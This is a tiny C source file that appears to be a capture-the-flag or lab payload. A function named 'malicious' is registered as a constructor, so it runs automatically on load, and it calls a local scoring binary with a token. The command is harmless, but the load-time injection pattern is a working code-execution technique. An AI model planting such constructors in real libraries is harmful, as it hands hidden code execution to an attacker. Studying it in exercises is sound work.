#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious(){
	system("/usr/local/bin/score 97565991-0bb9-4a7e-a0cc-889b21997c3a");
}
